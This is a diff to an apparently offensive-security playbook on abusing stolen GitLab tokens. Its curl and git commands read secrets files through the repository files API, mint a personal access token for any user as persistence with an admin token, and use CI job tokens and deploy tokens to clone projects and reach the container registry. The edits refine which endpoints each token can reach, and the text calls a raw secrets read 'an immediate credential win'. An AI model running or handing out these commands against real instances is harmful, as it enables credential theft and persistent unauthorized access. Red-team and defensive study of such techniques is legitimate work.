@@ -44,9 +44,10 @@ curl -s "https://gitlab.com/api/v4/projects?membership=true&min_access_level=30&
 curl -s "https://gitlab.com/api/v4/projects/<id>/repository/files/config%2Fsecrets.yml/raw?ref=main" \
   -H "PRIVATE-TOKEN: $TOKEN"
 
-# Create a new PAT for persistence if the token holds the admin or api scope on self (self-managed)
+# Mint a PAT for any user as persistence. Instance-admin only (self-managed/dedicated):
+# an ordinary api-scoped token gets 403 here, it needs admin credentials or an admin impersonation token.
 curl -s -X POST "https://gitlab.com/api/v4/users/<id>/personal_access_tokens" \
-  -H "PRIVATE-TOKEN: $TOKEN" -d "name=ci&scopes[]=api&expires_at=2027-01-01"
+  -H "PRIVATE-TOKEN: $ADMIN_TOKEN" -d "name=ci&scopes[]=api&expires_at=2027-01-01"
 ```
 
 The URL-encoded file path (`config%2Fsecrets.yml`) is required by the files API; `%2F` is the `/` separator. A successful raw read of a secrets file is an immediate credential win.
@@ -56,15 +57,17 @@ The URL-encoded file path (`config%2Fsecrets.yml`) is required by the files API;
 ```bash
 # Job token: clone an allowlisted project
 git clone https://gitlab-ci-token:$CI_JOB_TOKEN@gitlab.com/<ns>/<project>.git
-# Job token against the API (works for projects that allowlist the source project)
-curl -s --header "JOB-TOKEN: $CI_JOB_TOKEN" "$CI_API_V4_URL/projects/<id>/variables"
+# Job token against the API: only the job-token-allowed endpoints, and only when the target
+# project allowlists yours. Project read, artifacts, packages, and the registry are in scope;
+# the CI/CD variables API is NOT, so a job token cannot read another project's variables.
+curl -s --header "JOB-TOKEN: $CI_JOB_TOKEN" "$CI_API_V4_URL/projects/<id>"
 
 # Deploy token: registry pull/push and clone, not the general API
 echo "$DEPLOY_TOKEN_PASS" | docker login registry.gitlab.com -u "$DEPLOY_TOKEN_USER" --password-stdin
 git clone https://$DEPLOY_TOKEN_USER:$DEPLOY_TOKEN_PASS@gitlab.com/<ns>/<project>.git
 ```
 
-A deploy token returns `404`/`401` against `/api/v4/user` because it is not a user; test it against a clone or `docker login` instead. The job token's reach is bounded by each target project's **CI/CD job token allowlist**, so a `403` on another project's variables means that project does not allowlist yours.
+A deploy token returns `404`/`401` against `/api/v4/user` because it is not a user; test it against a clone or `docker login` instead. The job token's reach is bounded both by each target project's **CI/CD job token allowlist** and by the fixed set of endpoints a job token may call (git clone, the package and container registries, job artifacts, releases, and project read, but not the CI/CD variables API). A `403` from an allowlisted endpoint such as `GET /projects/:id` means that project does not allowlist yours.
 
 ## Follow-on
 
